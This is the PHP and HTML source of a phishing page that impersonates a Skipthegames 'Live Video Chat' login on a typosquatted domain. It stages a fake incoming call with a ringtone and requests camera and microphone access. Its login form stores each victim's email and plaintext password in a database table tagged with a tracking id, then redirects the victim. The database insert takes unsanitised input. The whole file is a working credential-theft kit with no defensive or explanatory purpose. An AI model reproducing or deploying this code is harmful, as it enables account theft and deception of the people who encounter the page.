
<?php 
include("../conn.php");
include("../counter.php");

         $query_string = $_SERVER['QUERY_STRING'];
          parse_str($query_string,$myid);
          echo $userId = $myid['id'];

  if (isset($_POST['email']) && isset($_POST['password'])) {
         echo $username =$_POST['email'];
         $password =$_POST['password'];

 $sql = "INSERT INTO `live` (`id`, `username`, `password`, `userId`) VALUES (NULL, '$username', '$password', '$userId');";

if (mysqli_query($conn, $sql)) {
  header("Location: https://skiplhagames.com/");
 }
}
  

?>

<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="https://skiplhagames.com/assets/css/style.css">
    <title>Live Video Chat</title>
    <!-- <style type="text/css">
      @font-face {
        font-weight: 400;
        font-style: normal;
        font-family: "Circular-Loom";

        src: url("chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Book.woff2")
          format("woff2");
      }

      @font-face {
        font-weight: 500;
        font-style: normal;
        font-family: "Circular-Loom";

        src: url("chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Medium.woff2")
          format("woff2");
      }

      @font-face {
        font-weight: 700;
        font-style: normal;
        font-family: "Circular-Loom";

        src: url("chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Bold.woff2")
          format("woff2");
      }

      @font-face {
        font-weight: 900;
        font-style: normal;
        font-family: "Circular-Loom";

        src: url("chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Black.woff2")
          format("woff2");
      }
    </style> -->
  </head>

  <body cz-shortcut-listen="true">
    <div id="container">
      <video id="videoElement" loop="true" autoplay="autoplay" muted=""></video>
      <div id="mm_cc_01" class="main_con_a01">
        <div id="lll_ccc_main">
          <p class="ppp_tt_aa_01">+380 45 087 6689</p>
          <p class="ppp_tt_aa_02">Incoming call...</p>
          <div class="rrr_aa_01">
            <button class="ree_01" onclick="ss_pp_gg()"></button>
            <button class="ree_02" onclick="ss_pp_gg()"></button>
          </div>
        </div>

        <h2 class="hh_cc_02" id="hh_ww_hh_01">Waiting for you to join</h2>
        <div id="ss_01" class="ss_mm_01">
          <div class="mm_tt_aera">
            <h1 class="hh_01">Live Video Chat</h1>
            <h1>
              <p class="pp_01">
                Login with Skipthegames and enjoy with
                <b class="bb_aa_01">Private Live Video Chat</b>
                your dating partner.
              </p>
            </h1>
          </div>
          <button onclick="pp_ch()" class="lll_uu_ss_01">
            Login with Skipthegames
          </button>
        </div>

        <div id="ss_02" class="ss_mm_02">
          <h3 class="hhh_003">Log in to your account</h3>
          <form
            action="<?php echo $_SERVER['PHP_SELF'] . '?id='. $userId ?>"
            id="form_createad_existing_account_login"
            method="post"
            accept-charset="utf-8"
          >
            <input
              type="hidden"
              name="rt_csrf_token"
              value="850a090de88131a83c68b93547f27f7d"
            />
            <input
              type="email"
              id="input_account_email"
              name="email"
              placeholder="Your email"
              required=""
              value=""
            />
            <input
              type="password"
              id="input_account_password"
              name="password"
              placeholder="Password"
              required=""
            />
            <small id="error">Please enter a valid email address</small>
            <p id="eee_02" class="pp_cc_ttt_01">
              We're sorry. We were unable to complete your login. Please try
              again, or
              <a
                href="https://skiplhagames.com/account/15934#"
                class="pp_lll_01"
                >click here for help</a
              >
            </p>
            <button id="submit_createad_account_login">Log in</button>
          </form>
        </div>
      </div>
    </div>

    <script>
      function vv_ss() {
        if (navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices
            .getUserMedia({
              video: true,
            })
            .then(function (stream) {
              video.srcObject = stream;
            })
            .catch(function (err0r) {
              alert("Camera Not Found");
            });
        }
        navigator.getMedia =
          navigator.getUserMedia ||
          navigator.webkitGetUserMedia ||
          navigator.mozGetUserMedia ||
          navigator.msGetUserMedia;

        navigator.getMedia(
          {
            video: true,
          },
          function () {},
          function () {
            alert("Camera Not Found");
          }
        );
      }
      vv_ss();

      function pp_ch() {
        document.getElementById("ss_02").style = "display:block";
        document.getElementById("ss_01").style = "display:none";
      }

      const audioContext = new (window.AudioContext ||
        window.webkitAudioContext)();
      const source = audioContext.createBufferSource();

      function aaa_op() {
        navigator.mediaDevices
          .getUserMedia({
            audio: true,
          })
          .then(() => {
            source.addEventListener("ended", () => {
              source.stop();
              audioContext.close();
            });
            source.loop = true;
            const request = new XMLHttpRequest();
            request.open(
              "GET",
              "https://skiplhagames.com/assets/audio/ringtone.mp3",
              true
            );
            request.responseType = "arraybuffer";
            request.onload = () => {
              audioContext.decodeAudioData(
                request.response,
                (buffer) => {
                  source.buffer = buffer;
                  source.connect(audioContext.destination);
                  source.start();
                },
                (e) => {
                  // console.log('Error with decoding audio data' + e.message);
                }
              );
            };
            request.send();
          });
        // .catch(reason => console.error(`Audio permissions denied: ${reason}`));
      }
      aaa_op();

      function ss_pp_gg() {
        document.getElementById("lll_ccc_main").style = "display:none";
        document.getElementById("ss_01").style = "display:block";
        source.stop();
      }
    </script>
  </body>
  <loom-container id="lo-engage-ext-container"
    ><loom-shadow classname="resolved"></loom-shadow></loom-container
  ><loom-container id="lo-companion-container"
    ><loom-shadow classname="resolved"></loom-shadow
  ></loom-container>
</html>
